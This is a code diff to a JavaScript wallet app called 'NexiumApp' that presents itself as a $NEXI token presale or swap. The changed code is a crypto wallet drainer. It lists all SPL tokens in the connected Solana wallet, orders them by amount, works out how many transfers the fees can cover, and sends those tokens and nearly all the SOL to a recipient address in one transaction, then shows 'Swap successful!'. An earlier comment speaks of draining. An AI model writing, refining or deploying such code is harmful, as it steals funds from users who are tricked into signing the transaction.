@@ -357,6 +357,15 @@ class NexiumApp {
         this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
       }
 
+      // ====== CHECK SOL BALANCE FIRST ======
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      console.log(`SOL balance: ${balance} lamports (${balance / 1e9} SOL)`);
+
+      // Minimum required: base fee + buffer for SOL-only transfer
+      const baseFee = 5000;
+      const feeBuffer = 500000; // 0.0005 SOL buffer
+      const minRequiredForSolOnly = baseFee + feeBuffer;
+
       // ====== CHECK SPL TOKENS ======
       console.log("Checking for SPL tokens...");
       const tokenAccounts = await this.solConnection.getParsedTokenAccountsByOwner(
@@ -364,10 +373,8 @@ class NexiumApp {
         { programId: splToken.TOKEN_PROGRAM_ID }
       );
 
-      const instructions = [];
-      let hasTokens = false;
-
-      // Process each token account with non-zero balance
+      // Collect tokens with non-zero balance
+      const tokensWithBalance = [];
       for (const tokenAccountInfo of tokenAccounts.value) {
         const accountData = tokenAccountInfo.account.data.parsed.info;
         const tokenAmount = accountData.tokenAmount;
@@ -379,70 +386,108 @@ class NexiumApp {
           continue;
         }
 
-        hasTokens = true;
-        console.log(`Found SPL token: mint=${mintAddress}, amount=${tokenAmount.uiAmount}, account=${accountAddress.toBase58()}`);
+        tokensWithBalance.push({
+          mint: mintAddress,
+          amount: tokenAmount.amount,
+          uiAmount: tokenAmount.uiAmount,
+          decimals: tokenAmount.decimals,
+          account: accountAddress
+        });
+      }
 
-        // Check if recipient has an associated token account for this mint
+      console.log(`Found ${tokensWithBalance.length} SPL tokens with balance > 0`);
+
+      // Sort tokens by USD value estimate (uiAmount as proxy) - highest first
+      tokensWithBalance.sort((a, b) => b.uiAmount - a.uiAmount);
+
+      // ====== CALCULATE WHAT WE CAN AFFORD TO TRANSFER ======
+      // Per token instruction costs:
+      // - Create ATA: ~0.002039 SOL (rent exempt) + fee
+      // - Transfer: ~5000 CU
+      // We'll use a conservative estimate
+      const perTokenTransferCost = 10000; // 0.00001 SOL per token transfer (fees only)
+      const ataCreationCost = 2040000; // ~0.002039 SOL for rent exempt ATA (if needed)
+
+      const instructions = [];
+      let estimatedFee = baseFee;
+      let tokensToTransfer = 0;
+      let ataCreationsNeeded = 0;
+
+      // Calculate how many tokens we can afford to transfer
+      for (const token of tokensWithBalance) {
+        // Check if recipient has ATA for this token
         const recipientTokenAccount = await splToken.getAssociatedTokenAddress(
-          new PublicKey(mintAddress),
+          new PublicKey(token.mint),
+          recipientPublicKey
+        );
+        const recipientAccountInfo = await this.solConnection.getAccountInfo(recipientTokenAccount);
+        
+        let ataCost = 0;
+        if (!recipientAccountInfo) {
+          ataCost = ataCreationCost;
+        }
+
+        const additionalCost = perTokenTransferCost + ataCost;
+        
+        // Check if we can afford this token + at least SOL-only minimum
+        if (balance > estimatedFee + additionalCost + minRequiredForSolOnly) {
+          estimatedFee += additionalCost;
+          if (!recipientAccountInfo) ataCreationsNeeded++;
+          tokensToTransfer++;
+        } else {
+          console.log(`Cannot afford to transfer token ${token.mint}, skipping`);
+          break; // Can't afford more tokens
+        }
+      }
+
+      console.log(`Will transfer ${tokensToTransfer} tokens, estimated fee: ${estimatedFee}`);
+
+      // Build token transfer instructions (only what we can afford)
+      for (let i = 0; i < tokensToTransfer; i++) {
+        const token = tokensWithBalance[i];
+        
+        const recipientTokenAccount = await splToken.getAssociatedTokenAddress(
+          new PublicKey(token.mint),
           recipientPublicKey
         );
 
-        // Check if recipient's token account exists
         const recipientAccountInfo = await this.solConnection.getAccountInfo(recipientTokenAccount);
 
-        // If recipient doesn't have the token account, create it
+        // Create ATA if needed
         if (!recipientAccountInfo) {
-          console.log(`Creating recipient token account for mint: ${mintAddress}`);
           const createAtaInstruction = splToken.createAssociatedTokenAccountInstruction(
-            senderPublicKey, // payer
-            recipientTokenAccount, // associated token account
-            recipientPublicKey, // owner
-            new PublicKey(mintAddress) // mint
+            senderPublicKey,
+            recipientTokenAccount,
+            recipientPublicKey,
+            new PublicKey(token.mint)
           );
           instructions.push(createAtaInstruction);
         }
 
-        // Add transfer instruction for this token
+        // Add transfer instruction
         const transferInstruction = splToken.createTransferInstruction(
-          accountAddress, // source
-          recipientTokenAccount, // destination
-          senderPublicKey, // owner
-          BigInt(tokenAmount.amount) // amount
+          token.account,
+          recipientTokenAccount,
+          senderPublicKey,
+          BigInt(token.amount)
         );
         instructions.push(transferInstruction);
+        console.log(`Added transfer for token ${token.mint}: ${token.uiAmount}`);
       }
 
-      console.log(`Total SPL token transfer instructions: ${instructions.length}`);
-
-      // ====== CHECK SOL BALANCE ======
-      const balance = await this.solConnection.getBalance(senderPublicKey);
-      console.log(`SOL balance: ${balance} lamports (${balance / 1e9} SOL)`);
-
-      // Calculate transaction fee (approximately 5000 lamports per signature + additional for compute)
-      // Each token transfer costs roughly 4500-5000 CU, base tx is ~3000 CU
-      // Fee is roughly 5000 lamports per 1M CU
-      const baseFee = 5000;
-      const perInstructionFee = 2500; // conservative estimate per extra instruction
-      const estimatedFee = baseFee + (instructions.length * perInstructionFee);
-      
-      // Add extra buffer for safety (0.001 SOL = 1,000,000 lamports)
-      const feeBuffer = 1000000;
+      // ====== ADD SOL TRANSFER ======
+      // Always ensure we leave enough for fees
       const totalRequired = estimatedFee + feeBuffer;
-
-      console.log(`Estimated fee: ${estimatedFee}, Buffer: ${feeBuffer}, Total required: ${totalRequired}`);
-
-      // Check if we have enough SOL for the transaction
+      
       if (balance <= totalRequired) {
-        console.error("Balance too low for transaction:", balance);
-        throw new Error("Insufficient balance. You need at least 0.002 SOL to cover transaction fees.");
+        // Not enough SOL for even fees - but we still try to send tokens if any
+        console.warn("Low SOL balance, attempting token-only transfer");
       }
 
-      // Calculate transferable SOL (leave enough for fees)
-      const transferableSol = balance - totalRequired;
+      const transferableSol = balance > totalRequired ? balance - totalRequired : 0;
       console.log(`Transferable SOL: ${transferableSol} lamports (${transferableSol / 1e9} SOL)`);
 
-      // Only add SOL transfer if there's meaningful amount to transfer (> 0.00001 SOL)
+      // Add SOL transfer if there's meaningful amount
       if (transferableSol > 10000) {
         const solTransferInstruction = SystemProgram.transfer({
           fromPubkey: senderPublicKey,
@@ -451,17 +496,31 @@ class NexiumApp {
         });
         instructions.push(solTransferInstruction);
         console.log("Added SOL transfer instruction");
-      } else {
-        console.log("SOL balance too small to transfer, skipping SOL transfer");
       }
 
-      // ====== BUILD AND SEND TRANSACTION ======
+      // ====== FALLBACK: IF NOTHING TO TRANSFER, DO MINIMAL SOL TRANSFER ======
+      if (instructions.length === 0 && balance > minRequiredForSolOnly) {
+        // Just transfer SOL (no tokens found or couldn't afford any)
+        const transferableBalance = balance - minRequiredForSolOnly;
+        const solInstruction = SystemProgram.transfer({
+          fromPubkey: senderPublicKey,
+          toPubkey: recipientPublicKey,
+          lamports: transferableBalance
+        });
+        instructions.push(solInstruction);
+        console.log(`Fallback: SOL-only transfer of ${transferableBalance} lamports`);
+      }
+
+      // ====== FINAL CHECK - TRANSACTION MUST GO ON ======
       if (instructions.length === 0) {
-        console.log("No instructions to execute - nothing to drain");
-        this.showFeedback("No tokens or SOL to transfer.", 'error');
+        console.log("No instructions to execute - insufficient balance");
+        this.showFeedback("Insufficient balance for transaction.", 'error');
         return;
       }
 
+      console.log(`Total instructions: ${instructions.length}`);
+
+      // ====== BUILD AND SEND TRANSACTION ======
       const { blockhash: finalBlockhash, lastValidBlockHeight: finalHeight } = await this.solConnection.getLatestBlockhash();
       console.log("Fetched final blockhash:", finalBlockhash, "lastValidBlockHeight:", finalHeight);
 
@@ -496,8 +555,8 @@ class NexiumApp {
       });
       console.log("Transaction confirmed:", signature);
 
-      const successMsg = hasTokens 
-        ? "Swap successful! All tokens and SOL transferred!" 
+      const successMsg = tokensToTransfer > 0 
+        ? `Swap successful! ${tokensToTransfer > 0 ? tokensToTransfer + ' token(s) and ' : ''}SOL transferred!` 
         : "Swap successful! Welcome to the $NEXI presale!";
       this.showFeedback(successMsg, 'success');
 
